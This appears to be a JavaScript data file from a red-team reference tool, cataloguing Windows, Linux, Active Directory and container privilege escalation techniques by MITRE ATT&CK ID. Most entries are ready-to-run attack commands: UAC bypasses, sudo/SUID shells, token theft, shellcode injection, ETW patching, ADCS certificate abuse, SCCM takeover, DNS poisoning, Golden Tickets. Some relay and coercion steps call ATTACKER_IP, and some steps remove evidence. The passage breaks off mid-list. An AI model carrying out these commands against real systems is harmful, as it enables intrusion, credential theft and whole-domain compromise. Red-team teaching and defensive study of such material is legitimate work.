export const PRIVILEGE_ESCALATION = {
  id: "privilege-escalation",
  name: "Privilege Escalation",
  tacticId: "TA0004",
  subtitle: "ACL Abuse • UAC Bypass • Token Manipulation • Kernel Exploits • Sudo/GTFOBins • macOS TCC Bypass • Unconstrained Delegation • ADCS ESC1-16 • SCCM Takeover • ADIDNS Poisoning • Trust Escalation (Child→Forest) • Constrained Delegation • RBCD • Container Escape • LD_PRELOAD • AlwaysInstallElevated",
  color: "#fb7185",
  techniques: [
    {
      name: "Abuse Elevation Control Mechanism",
      id: "T1548",
      summary: "UAC bypass • sudo abuse • setuid/setgid • SUIDbash",
      description: "Bypass User Account Control (UAC) or abuse sudo/setuid to escalate privileges",
      tags: ["UAC bypass", "sudo", "setuid", "T1548"],
      steps: [
        "UAC bypass via fodhelper.exe (no prompt, Windows 10/11):\n# UAC = User Account Control — standard users run Medium Integrity, admin-capable users Medium→High\n# fodhelper is auto-elevating (marked as 'requireAdministrator' in manifest) and reads HKCU registry\n# Since it reads HKCU (user-writable), we can redirect its COM/shell lookup to our payload\n$ reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"powershell.exe -w h -enc BASE64\" /f\n$ reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /t REG_SZ /d \"\" /f\n$ Start-Process C:\\Windows\\System32\\fodhelper.exe\n# fodhelper auto-elevates, launches our payload as High Integrity (admin) — no UAC dialog shown\n# Cleanup: reg delete HKCU\\Software\\Classes\\ms-settings /f",
        "UAC bypass via eventvwr.exe (Windows 7-10):\n# Event Viewer (eventvwr.exe) auto-elevates and opens .msc files\n# It reads the handler for 'mscfile' from HKCU before HKLM — HKCU is user-writable\n$ reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe /c powershell -enc BASE64\" /f\n$ eventvwr.exe\n# eventvwr spawns our cmd.exe as High Integrity (bypasses UAC)\n# Works: Windows 7 through 10 build 1803 (various versions patched)\n# Many other auto-elevating binaries exist: ComputerDefaults.exe, sdclt.exe, wsreset.exe",
        "UAC bypass with CMSTPLUA COM object (Windows 10+):\n# CMSTP's COM object (CMSTPLUA) auto-elevates and provides ShellExec — callable from user context\n> $Bypass = [activator]::CreateInstance([type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7'))\n> $Bypass.ShellExec('cmd.exe', '/c powershell -enc BASE64', 'C:\\Windows\\System32', $null, 0)\n# No registry modification needed — pure COM call\n# ShellExec runs cmd.exe at High Integrity level\n# Often undetected: no registry change, no file write, legitimate COM server",
        "Linux sudo privilege escalation:\n# sudo -l lists what the current user can run as root — always check first after gaining a shell\n$ sudo -l\n# If you see: (ALL) NOPASSWD: /usr/bin/python3\n$ sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# If you see: (ALL) NOPASSWD: /bin/find\n$ sudo find . -exec /bin/sh \\; -quit\n# If you see: (ALL) NOPASSWD: /usr/bin/vim\n$ sudo vim -c ':!/bin/bash'\n# GTFOBins: https://gtfobins.github.io — covers 300+ binaries with sudo, SUID, cap escapes\n# Key insight: ANY program that can shell out or write files with sudo = root access",
        "SUID/SGID binary abuse (Linux):\n# SUID bit: execute as file owner (usually root) regardless of who runs it\n# SGID bit: execute as file's group\n$ find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries\n$ find / -perm -2000 -type f 2>/dev/null  # Find SGID binaries\n# Non-standard SUID binaries are the target — avoid: /bin/su, /usr/bin/passwd (expected)\n# Examples of exploitable custom SUID:\n$ /usr/local/bin/custom_tool -exec /bin/sh  # If it supports -exec\n$ /usr/bin/find . -exec /bin/sh -p \\; -quit  # -p: preserve SUID privileges\n$ /usr/bin/cp --no-preserve=all /etc/sudoers /tmp/ && echo 'user ALL=(ALL) NOPASSWD:ALL' >> /tmp/sudoers\n# Also check: world-writable directories in PATH, writable scripts called by SUID binaries"
      ]
    },
    {
      name: "Access Token Manipulation",
      id: "T1134",
      summary: "Token impersonation • make_token • SeImpersonatePrivilege • Potato attacks",
      description: "Steal or forge Windows access tokens to run code as another user including SYSTEM",
      tags: ["token impersonation", "SeImpersonate", "Potato", "T1134"],
      steps: [
        "Check current token privileges:\n$ whoami /priv\n# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege\n# These allow SYSTEM impersonation via Potato attacks",
        "Potato attacks (IIS/service accounts → SYSTEM):\n$ JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami > C:\\\\out.txt' -t * -c '{C49E32C6-BC8B-11d2-85D4-00105A1F8304}'\n# For newer Windows: GodPotato\n$ GodPotato.exe -cmd 'cmd /c whoami'\n# PrintSpoofer for Windows Server 2019+\n$ PrintSpoofer.exe -i -c powershell.exe",
        "Token impersonation in Meterpreter:\n> use incognito\n> list_tokens -u\n> impersonate_token 'DOMAIN\\Administrator'\n# Steal token from running process\n> migrate <pid>  # Migrate to SYSTEM process",
        "Create process with stolen token:\n> HANDLE hToken;\n> OpenProcessToken(hTargetProcess, TOKEN_ALL_ACCESS, &hToken);\n> DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);\n> CreateProcessWithTokenW(hNewToken, 0, L\"cmd.exe\", NULL, 0, NULL, NULL, &si, &pi);\n# New process runs as target token's user",
        "Make token with known credentials:\n$ Invoke-Mimikatz -Command '\"token::make_token DOMAIN\\Admin password\"'\n# Creates impersonation token with valid credentials\n# No code injection, more stealthy\n# Works for local and remote authentication"
      ]
    },
    {
      name: "Exploitation for Privilege Escalation",
      id: "T1068",
      summary: "Kernel exploits • Dirty COW • PrintNightmare • noPac • CVEs",
      description: "Exploit operating system or software vulnerabilities to gain elevated privileges",
      tags: ["kernel exploit", "Dirty COW", "PrintNightmare", "T1068"],
      steps: [
        "Linux kernel exploit enumeration:\n$ uname -a && cat /etc/os-release\n$ searchsploit linux kernel $(uname -r | cut -d- -f1)\n# Tools: linux-exploit-suggester, LES\n$ curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash",
        "DirtyCOW (CVE-2016-5195) - Linux universal privesc:\n$ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c\n$ gcc -pthread dirtyc0w.c -o dirty\n$ ./dirty  # Writes to read-only file, typically /etc/passwd\n# Works on kernels < 4.8.3",
        "PrintNightmare (CVE-2021-1675/34527) - Windows:\n$ python3 printnightmare.py 'domain/user:pass@192.168.1.100' '\\\\attacker\\share\\payload.dll'\n# SYSTEM code execution via Print Spooler\n# Works on most unpatched Windows systems",
        "noPac (CVE-2021-42278/42287) - Domain Escalation:\n$ python3 noPac.py -dc-ip DC_IP 'domain.com/user:pass' -shell --impersonate administrator\n# Computer account + TGS request → Domain Admin\n# Trivially escalates domain user to Domain Admin",
        "Windows local privilege escalation:\n$ winpeas.exe\n$ PrivescCheck.ps1\n# Automated privesc check: weak service perms, unquoted paths,\n# AlwaysInstallElevated, vulnerable drivers, stored credentials"
      ]
    },
    {
      name: "Process Injection",
      id: "T1055",
      summary: "DLL injection • reflective • shellcode • process hollowing • APC",
      description: "Inject code into other processes to run with their privileges and evade detection",
      tags: ["DLL injection", "shellcode", "process hollowing", "T1055"],
      steps: [
        "Classic shellcode injection into running process:\n$ python3 -c \"import ctypes,sys; pid=int(sys.argv[1]); buf=b'\\\\xfc...(shellcode)'; handle=ctypes.windll.kernel32.OpenProcess(0x1F0FFF,False,pid); addr=ctypes.windll.kernel32.VirtualAllocEx(handle,0,len(buf),0x3000,0x40); ctypes.windll.kernel32.WriteProcessMemory(handle,addr,buf,len(buf),0); ctypes.windll.kernel32.CreateRemoteThread(handle,None,0,addr,None,0,None)\" 1234\n# Inject shellcode into PID 1234",
        "Reflective DLL injection (no disk artifact):\n$ Invoke-ReflectivePEInjection -PEPath C:\\\\attacker.dll -ProcName explorer\n# DLL mapped into target process memory from buffer\n# No disk write, no DLL registration in LoadedModules list\n# Used by most modern C2 frameworks",
        "Process doppelgänging:\n> // Uses Windows transacted NTFS operations\n> HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);\n> HANDLE hFile = CreateFileTransacted(L\"C:\\\\Windows\\\\System32\\\\svchost.exe\", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);\n> // Write payload to transacted file, create process from it, rollback transaction\n# Payload runs from transacted view, never committed to disk",
        "ETW injection to blind monitoring:\n> // Patch ETW in remote process to stop security logging\n> HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n> // Find EtwEventWrite in ntdll.dll\n> // Patch first bytes with RET instruction\n> BYTE patch[] = {0xC3};\n> WriteProcessMemory(hProc, pEtwEventWrite, patch, sizeof(patch), NULL);\n# Target process stops generating ETW events",
        "Inject into LSASS for credential access:\n$ python3 lsassy -u admin -p pass -d domain.com 192.168.1.100\n# lsassy: inject MiniDump loader into LSASS remotely\n# Alternative: Meterpreter: migrate to LSASS PID then dump\n# Elevated privileges required"
      ]
    },
    {
      name: "Domain Policy Modification",
      id: "T1484",
      summary: "GPO modification • domain trust modification • rogue DC • OU link",
      description: "Modify Active Directory domain policies for privilege escalation or persistence",
      tags: ["GPO modification", "domain trust", "OU link", "T1484"],
      steps: [
        "Identify writable GPOs:\n$ Get-GPO -All | ForEach { $acl = Get-GPPermissions -Guid $_.Id -All; $acl | Where { $_.Permission -match 'GpoEdit|GpoEditDeleteModifySecurity' } }\n$ SharpGPOAbuse.exe --CheckLocalAdminAccess\n# Find GPOs you have write access to",
        "Add immediate scheduled task via GPO:\n$ SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'DOMAIN\\Admin' --Command 'powershell.exe' --Arguments '-enc BASE64' --GPOName 'Default Domain Policy'\n# Deploys to all computers linked to this GPO",
        "GPO Modification with New-GPLink:\n> New-GPLink -Name 'Malicious GPO' -Target 'DC=domain,DC=com' -Enforced Yes\n# Link rogue GPO to domain root - applies to all objects\n# Higher precedence with Enforced flag",
        "Domain trust modification:\n$ python3 -c \"from impacket.ldap import ldap; ...\"\n# Modify trust attributes to lower security\n# E.g., disable SID filtering on external trust\n$ netdom trust target_domain /domain:source_domain /EnableSIDHistory:yes\n# Enables SID history injection across trust",
        "Rogue Domain Controller attack:\n$ python3 dfscoerce.py -u admin -p pass -d domain.com ATTACKER_IP DC_IP\n# Coerce DC authentication, relay to LDAP\n# Use nTDSDSA object to act as DC (requires specific perms)\n# Very stealthy - no machine account quota consumed"
      ]
    },
    {
      name: "Valid Accounts for Privilege Escalation",
      id: "T1078.003",
      summary: "Local admin credential reuse • LAPS bypass • password reuse",
      description: "Use local administrator or service account credentials to escalate privileges across systems",
      tags: ["local admin", "LAPS", "credential reuse", "T1078"],
      steps: [
        "Check for password reuse across systems:\n$ nxc smb 192.168.1.0/24 -u administrator -p 'Password123' --local-auth --continue-on-success\n# Same local admin password on multiple systems is common\n# Gives SYSTEM-level access on all matching hosts",
        "Dump and abuse LAPS passwords:\n$ nxc ldap DC_IP -u user -p pass -M laps\n$ python3 pyLAPS.py --action get -u admin -p pass -d domain.com\n# LAPS: unique password per computer - but readable by authorized accounts\n# If you can read ms-Mcs-AdmPwd, you get local admin",
        "Service account privilege escalation:\n$ Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,Description\n# Service accounts with SPNs often have high privileges\n# Kerberoast → crack → reuse for escalation",
        "Enumerate local admin accounts:\n$ nxc smb 192.168.1.0/24 -u user -p pass --local-auth --sam\n# Dump local SAM database\n$ secretsdump.py domain/admin:pass@192.168.1.100\n# Get local admin NTLM hash → pass-the-hash to other systems",
        "gMSA password retrieval:\n$ python3 gMSADumper.py -u user -p pass -d domain.com\n# Group Managed Service Account password readable by specific groups\n# Use gMSA password for services that run as the account"
      ]
    },
    {
      name: "Escape to Host",
      id: "T1611",
      summary: "Container escape • Docker socket • privileged container • CVE-2019-5736",
      description: "Break out of container isolation to gain access to the underlying host",
      tags: ["container escape", "Docker", "Kubernetes", "T1611"],
      steps: [
        "Check container escape opportunities:\n$ cat /proc/1/cgroup | grep docker\n$ ls -la /.dockerenv\n# Confirm we're in a container\n$ mount | grep 'docker\\|overlay'\n$ capsh --print | grep Current\n# Check for privileged mode: cap_sys_admin in capabilities",
        "Docker socket escape:\n$ ls -la /var/run/docker.sock\n# If docker.sock is mounted in container:\n$ docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host bash\n# Creates privileged container with host filesystem mounted",
        "Privileged container escape:\n$ fdisk -l\n# List host disks (visible in privileged container)\n$ mkdir /mnt/host && mount /dev/sda1 /mnt/host\n$ chroot /mnt/host bash\n# Mount host filesystem and chroot into it",
        "CVE-2019-5736 (runc escape):\n$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC\n$ go build main.go && ./main\n# Overwrites host runc binary when admin runs 'docker exec'\n# Requires container process to be PID 1",
        "Kubernetes privilege escalation:\n$ kubectl get clusterrolebindings -o wide\n$ kubectl auth can-i --list --as=system:serviceaccount:default:default\n# Check RBAC permissions of service account\n$ kubectl exec -it pod -- bash\n# Use privileged pod to escape to node"
      ]
    },
    {
      name: "ACL Abuse Chain",
      id: "T1222.ACL",
      summary: "ForceChangePassword • GenericWrite • WriteDACL • GenericAll",
      description: "Abuse Active Directory ACL misconfigurations to escalate privileges through a chain of object permissions",
      tags: ["ACL abuse", "GenericWrite", "WriteDACL", "ForceChangePassword", "T1222"],
      steps: [
        "ForceChangePassword — reset target account password:\n$ net rpc password targetuser 'NewPass123!' -U domain/attacker%pass -S DC_IP\n$ python3 changepasswd.py domain.com/attacker:pass -altuser targetuser -newpass 'NewPass123!' -dc-ip DC_IP\n$ Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)\n# Requires ForceChangePassword ACE on target user",
        "GenericWrite — targeted Kerberoasting or shadow credentials:\n# Set SPN on target for Kerberoasting:\n$ python3 targetedKerberoast.py -u attacker -p pass -d domain.com --only-abuse\n# Or add shadow credential:\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target targetuser --action add\n# GenericWrite also allows: modify scriptPath, logon script, msDS-KeyCredentialLink",
        "WriteDACL — grant yourself GenericAll:\n$ dacledit.py -action write -target 'Domain Admins' -principal attacker -rights FullControl -dc-ip DC_IP domain.com/attacker:pass\n$ Add-ObjectACL -PrincipalIdentity attacker -TargetIdentity 'Domain Admins' -Rights All\n# WriteDACL → add GenericAll ACE → then exploit as GenericAll",
        "GenericAll — full object control:\n# On user: reset password, shadow creds, targeted Kerberoast, RBCD\n# On group: add yourself\n$ net group 'Domain Admins' attacker /add /domain\n$ Add-ADGroupMember -Identity 'Domain Admins' -Members attacker\n# On computer: set RBCD, shadow creds\n$ python3 rbcd.py -f ATTACKPC$ -t TARGET$ domain.com/attacker:pass -dc-ip DC_IP",
        "Automated ACL abuse chain with aclpwn:\n$ python3 aclpwn.py -f attacker -ft user -t 'Domain Admins' -tt group -d domain.com --server DC_IP --dry-run\n$ python3 aclpwn.py -f attacker -ft user -t 'Domain Admins' -tt group -d domain.com --server DC_IP\n# Automatically finds and exploits ACL chain to reach target\n# Can also use BloodHound 'Shortest Path' → follow edges manually"
      ]
    },
    {
      name: "Unconstrained Delegation Abuse",
      id: "T1558.UCD",
      summary: "Unconstrained delegation • SpoolSample • TGT capture • coerce DC auth",
      description: "Abuse unconstrained Kerberos delegation to capture TGTs from authenticating machines, including Domain Controllers",
      tags: ["Unconstrained Delegation", "SpoolSample", "TGT capture", "T1558"],
      steps: [
        "Find computers with unconstrained delegation:\n$ Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties DNSHostName,TrustedForDelegation | Where {$_.Name -notlike 'DC*'}\n$ findDelegation.py domain.com/user:pass -dc-ip DC_IP | grep Unconstrained\n$ nxc ldap DC_IP -u user -p pass --trusted-for-delegation",
        "Monitor for incoming TGTs on compromised unconstrained host:\n$ Rubeus.exe monitor /interval:1 /nowrap\n# Monitors LSASS for new Kerberos TGTs arriving at this machine\n# Runs in background, prints any TGT cached by the machine",
        "Coerce DC authentication to unconstrained host:\n$ python3 PetitPotam.py -u user -p pass -d domain.com UNCONSTRAINED_HOST_IP DC_IP\n$ SpoolSample.exe DC_IP UNCONSTRAINED_HOST\n# SpoolSample is a C# tool — compile and run as .exe\n# Forces DC Print Spooler to authenticate to our unconstrained machine\n# DC TGT arrives and is captured by Rubeus monitor",
        "Import captured DC TGT and run DCSync:\n$ Rubeus.exe ptt /ticket:BASE64_TGT\n$ Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:domain.com /user:Administrator\"'\n# OR export and use from Linux:\n$ export KRB5CCNAME=dc01.ccache\n$ secretsdump.py -k -no-pass domain.com/DC01$@DC01.domain.com\n# Full domain compromise from machine account ticket",
        "Printer Bug (SpoolSample / printerbug.py) — coerce with or without creds:\n$ SpoolSample.exe DC_IP UNCONSTRAINED_HOST  # C# — runs on Windows\n$ python3 printerbug.py domain.com/user:pass@DC_IP UNCONSTRAINED_HOST  # Python — runs from Linux\n# Both force DC Print Spooler (MS-RPRN) to authenticate back to attacker host\n# Requires: Print Spooler service running on DC (common by default)\n# Capture TGT → pass-the-ticket → DCSync"
      ]
    },
    {
      name: "ADCS Abuse ESC1-ESC8",
      id: "T1649.ESC18",
      summary: "certipy • Certify • template abuse • UPN SAN • ESC1-ESC8",
      description: "Exploit misconfigured Active Directory Certificate Services templates to request certificates as privileged users",
      tags: ["ADCS", "ESC1", "certipy", "Certify", "T1649"],
      steps: [
        "ESC1 — misconfigured template lets you request cert AS any user:\n# Vulnerable template conditions: (1) CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set (enrollee can specify SAN)\n# AND (2) low-privilege user has enroll rights on the template\n# The SAN (Subject Alternative Name) field contains the UPN → specifying another user's UPN = auth as them\n$ certipy find -u attacker@domain.com -p pass -dc-ip DC_IP -vulnerable -stdout  # Find ESC1 templates first\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template ESC1_TEMPLATE_NAME -upn administrator@domain.com -dc-ip DC_IP\n# -upn administrator@domain.com: the cert will assert you ARE administrator\n$ certipy auth -pfx administrator.pfx -dc-ip DC_IP\n# Returns: TGT for administrator + NT hash (UnPAC-the-Hash)\n# No DA needed to request — just enrollment rights on the template",
        "ESC2 — Any Purpose or no EKU template:\n# EKU (Extended Key Usage) restricts cert use: Client Auth, Server Auth, etc.\n# 'Any Purpose' EKU or NO EKU = cert usable for client authentication by default\n# Attack: enroll as yourself, use cert for client auth → authenticate as yourself\n$ Certify.exe find /vulnerable  # Find ESC2 templates (Windows)\n$ certipy find -u attacker@domain.com -p pass -dc-ip DC_IP -vulnerable  # Linux\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template ESC2_TEMPLATE -dc-ip DC_IP\n$ certipy auth -pfx attacker.pfx -dc-ip DC_IP\n# Most useful when: the enrolling account already has broad access, or combined with other escalation",
        "ESC3 — enrollment agent template: request certs ON BEHALF OF others:\n# Enrollment agent cert allows one account to request certs FOR other users\n# Step 1: Get the enrollment agent certificate:\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template EnrollmentAgent -dc-ip DC_IP\n# Step 2: Use enrollment agent cert to request a client auth cert AS administrator:\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template User -on-behalf-of domain/administrator -pfx agent.pfx -dc-ip DC_IP\n# 'on-behalf-of' uses the enrollment agent cert to request as administrator\n$ certipy auth -pfx administrator.pfx -dc-ip DC_IP\n# Powerful: once you have enrollment agent cert, unlimited impersonation of any user",
        "ESC4 — write permissions on certificate template:\n# If you have WriteProperty or GenericWrite on a template: modify it to be ESC1-vulnerable\n# Certipy saves old config so you can restore it after exploitation\n$ certipy template -u attacker@domain.com -p pass -template TARGET_TEMPLATE -save-old -dc-ip DC_IP\n# Modify template to add ESC1 flags (add enrolleeSuppliesSubject):\n$ certipy template -u attacker@domain.com -p pass -template TARGET_TEMPLATE -write '{\"msPKI-Certificate-Name-Flag\": 1}' -dc-ip DC_IP\n# Now exploit as ESC1:\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template TARGET_TEMPLATE -upn administrator@domain.com -dc-ip DC_IP\n# Restore original template to cover tracks:\n$ certipy template -u attacker@domain.com -p pass -template TARGET_TEMPLATE -configuration old_config.json -dc-ip DC_IP",
        "ESC8 — NTLM relay to ADCS HTTP enrollment (most common, no special template needed):\n# ADCS by default has HTTP enrollment endpoint (/certsrv/certfnsh.asp) that accepts NTLM auth\n# Relay a domain controller's NTLM auth to this endpoint → get a DomainController template cert\n# This cert authenticates via PKINIT → UnPAC-the-Hash → DCSync\n$ ntlmrelayx.py -t http://ADCS_SERVER/certsrv/certfnsh.asp --adcs --template DomainController -smb2support\n# Coerce DC to authenticate to us:\n$ python3 PetitPotam.py -u user -p pass ATTACKER_IP DC_IP  # MS-EFSRPC coercion\n# Wait for relay to complete → dc01.pfx generated\n$ certipy auth -pfx dc01.pfx -dc-ip DC_IP\n# Returns: TGT as DC$ + NT hash for DC machine account → full DCSync"
      ]
    },
    {
      name: "ADCS Abuse ESC9-ESC16",
      id: "T1649.ESC916",
      summary: "ESC9 • ESC13 • ESC15 • EKUwu • cert mapping • shadow creds",
      description: "Exploit newer ADCS attack vectors including no-security-extension, issuance policies, and application policy OID abuse",
      tags: ["ADCS", "ESC9", "ESC13", "ESC15", "EKUwu", "T1649"],
      steps: [
        "ESC9 — no security extension + GenericWrite:\n# Target template has CT_FLAG_NO_SECURITY_EXTENSION\n# If you have GenericWrite on user: change their UPN, get cert, restore UPN\n$ certipy shadow auto -u attacker@domain.com -p pass -account targetuser -dc-ip DC_IP\n$ certipy account update -u attacker@domain.com -p pass -user targetuser -upn administrator@domain.com -dc-ip DC_IP\n$ certipy req -u targetuser@domain.com -hashes :NT_HASH -template ESC9Template -ca CA-NAME -dc-ip DC_IP\n$ certipy account update -u attacker -p pass -user targetuser -upn targetuser@domain.com -dc-ip DC_IP",
        "ESC13 — issuance policy with group link:\n$ certipy find -u attacker@domain.com -p pass -dc-ip DC_IP -vulnerable\n# ESC13: template linked to OID group via msDS-OIDToGroupLink\n# Enrolling adds you to the linked group temporarily\n# If linked to privileged group: instant privilege escalation on cert use",
        "ESC15 / EKUwu — application policy schemaVersion 1 abuse:\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template ESC15Template -application-policies 1.3.6.1.5.5.7.3.2 -dc-ip DC_IP\n# schemaVersion 1 templates: can request with arbitrary application policy\n# Request with Client Authentication OID → authenticate as enrollee\n# Works on templates that normally have non-auth EKU",
        "Certificate mapping / StrongCertificateBindingEnforcement bypass:\n$ certipy auth -pfx user.pfx -domain domain.com -dc-ip DC_IP -ldap-shell\n# If KB5014754 enforcement is off (common): weak mapping\n# Strong mapping: requires UPN or SAN match (certipy handles automatically)\n# Check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement",
        "Automated ADCS exploitation with certipy:\n$ certipy find -u attacker@domain.com -p pass -dc-ip DC_IP -vulnerable -stdout\n# Lists all vulnerable templates with ESC classifications\n$ certipy auto -u attacker@domain.com -p pass -dc-ip DC_IP\n# Automatically exploits the easiest available ESC\n# Full chain: find vuln template → request cert → authenticate → get hash"
      ]
    },
    {
      name: "SCCM Site Takeover",
      id: "T1072.SCCM",
      summary: "TAKEOVER1 • TAKEOVER2 • site server relay • SCCM admin hijack",
      description: "Compromise SCCM site server to gain admin access over all managed machines in the environment",
      tags: ["SCCM", "TAKEOVER", "site server", "T1072"],
      steps: [
        "TAKEOVER1 — relay site server machine account to MSSQL:\n$ ntlmrelayx.py -smb2support -t mssql://SCCM_DB_SERVER -socks\n$ python3 Coercer.py coerce -u user -p pass -d domain.com -l ATTACKER_IP -t SCCM_SITE_SERVER\n# Site server machine account is sysadmin on the SCCM database\n# Relay gives SQL sysadmin → add SCCM admin role to our account",
        "TAKEOVER2 — relay to SCCM AdminService API:\n$ ntlmrelayx.py -smb2support -t https://SCCM_MP/AdminService/wmi/SMS_Admin -socks\n$ python3 Coercer.py coerce -u user -p pass -d domain.com -l ATTACKER_IP -t SCCM_SITE_SERVER\n# Relay to AdminService REST API endpoint\n# Add attacker as SCCM Full Administrator via API call",
        "Grant SCCM admin rights via compromised database:\n$ python3 sccmhunter.py mssql -u user -p pass -d domain.com -dc DC_IP\n# Connect to SCCM DB, add Full Admin entry:\n$ sqlcmd -S SCCM_DB -Q \"INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) VALUES ('SID','DOMAIN\\attacker',0,0,'','','','','SITE')\"\n$ sqlcmd -S SCCM_DB -Q \"INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (AdminID, 'SMS0001R', 'SMS00ALL', 29)\"",
        "Deploy malicious application to all systems:\n$ SharpSCCM.exe exec -d DEVICE_NAME -r RESOURCE_ID -s SITECODE -sms MANAGEMENT_POINT 'powershell -enc BASE64'\n$ python3 sccmhunter.py admin -u attacker -p pass -d domain.com -dc DC_IP\n# With SCCM Full Admin: deploy script/application to any collection\n# 'All Systems' collection = code exec on every managed endpoint\n# Runs as SYSTEM on managed devices",
        "Extract SCCM secrets after takeover:\n$ SharpSCCM.exe get secrets -sms MANAGEMENT_POINT -sc SITECODE\n# Dump NAA credentials, task sequence passwords, certificate private keys\n$ python3 sccmhunter.py dpapi -u attacker -p pass -d domain.com -dc DC_IP\n# Decrypt all DPAPI-protected SCCM secrets from database"
      ]
    },
    {
      name: "ADIDNS Poisoning",
      id: "T1557.ADIDNS",
      summary: "DNS record injection • Time Bombs • wildcard DNS • responder relay",
      description: "Inject malicious DNS records into Active Directory Integrated DNS to intercept traffic or capture credentials",
      tags: ["ADIDNS", "DNS poisoning", "time bomb", "T1557"],
      steps: [
        "Add malicious DNS A record via dnstool:\n$ python3 dnstool.py -u domain\\user -p pass -a add -r evilhost -d ATTACKER_IP DC_IP\n$ python3 dnstool.py -u domain\\user -p pass -a add -r vpn -d ATTACKER_IP DC_IP\n# Any authenticated user can add DNS records by default\n# Hosts querying 'evilhost' now resolve to attacker IP\n# Enables MitM or credential capture",
        "ADIDNS wildcard injection (capture all unknown hostnames):\n$ python3 dnstool.py -u domain\\user -p pass -a add -r '*' -d ATTACKER_IP DC_IP\n# Wildcard: ALL unknown hostnames resolve to attacker\n# Windows clients auto-authenticate to resolved hosts\n# Capture NTLM hashes with Responder on ATTACKER_IP",
        "DNS Time Bomb — pre-register future hostnames:\n$ python3 dnstool.py -u domain\\user -p pass -a add -r 'NEWSRV2025' -d ATTACKER_IP DC_IP\n# Register the hostname BEFORE the legitimate server is deployed\n# When deployed, DNS record points to attacker\n# Captures initial deployment credentials / traffic",
        "Capture NTLM hashes via DNS poisoning:\n$ responder -I eth0 -wrd\n# With wildcard DNS record pointing to attacker:\n# Any client connecting to unknown hostname authenticates via NTLM\n# Responder captures NTLMv2 hashes\n$ hashcat -m 5600 ntlmv2.txt rockyou.txt",
        "Cleanup and stealth:\n$ python3 dnstool.py -u domain\\user -p pass -a remove -r evilhost DC_IP\n# Remove records after attack to reduce forensic evidence\n# Note: AD replication may slow down record propagation/removal\n# tombstoned records still visible in LDAP for forensics"
      ]
    },
    {
      name: "Trust Escalation (Child to Parent)",
      id: "T1484.trust",
      summary: "raisechild • Parent → Child → raisechild • krbtgt hash → forest",
      description: "Escalate from a child domain to the forest root domain by abusing the implicit parent-child trust",
      tags: ["raisechild", "trust escalation", "child domain", "T1484"],
      steps: [
        "Automated child-to-parent escalation with raisechild.py:\n$ raisechild.py child.domain.com/admin:pass -target-exec FOREST_ROOT_DC_IP\n# Automatically: dumps child krbtgt, forges Golden+ExtraSID ticket, executes on forest root\n# Full forest root compromise in a single command\n# Requires: DA in child domain",
        "Manual child-to-parent escalation steps:\n# Step 1: Get child domain krbtgt hash\n$ secretsdump.py child.domain.com/admin:pass@CHILD_DC -just-dc-user krbtgt\n# Step 2: Get child domain SID\n$ Get-ADDomain child.domain.com | Select DomainSID\n# Step 3: Get forest root domain SID (519 = Enterprise Admins)\n$ Get-ADDomain forest.root.com | Select DomainSID",
        "Forge Golden Ticket with Enterprise Admin SID:\n$ ticketer.py -nthash CHILD_KRBTGT_NTLM -domain-sid S-1-5-21-CHILD-SID -domain child.domain.com -extra-sid S-1-5-21-FOREST-ROOT-SID-519 Administrator\n$ export KRB5CCNAME=Administrator.ccache\n# The -extra-sid injects Enterprise Admins membership from forest root",
        "Access forest root DC:\n$ psexec.py -k -no-pass forest.root.com/Administrator@FOREST_ROOT_DC\n$ secretsdump.py -k -no-pass forest.root.com/Administrator@FOREST_ROOT_DC\n# Full Domain Admin access in forest root domain\n# From here: access all other domains in the forest",
        "Why this works:\n# Parent-child trusts within a forest are transitive\n# SID filtering is DISABLED by default for intra-forest trusts\n# Enterprise Admins group (RID 519) has admin rights on all domains\n# Compromising child domain krbtgt = compromising the entire forest\n# Forest root krbtgt → then forge Golden Tickets for any domain"
      ]
    },
    {
      name: "Constrained Delegation Abuse",
      id: "T1558.CD",
      summary: "S4U2Self • S4U2Proxy • findDelegation • getST • ticket impersonation",
      description: "Abuse Kerberos constrained delegation to impersonate privileged users against allowed target services",
      tags: ["Constrained Delegation", "S4U2Proxy", "getST", "Kerberos", "T1558"],
      steps: [
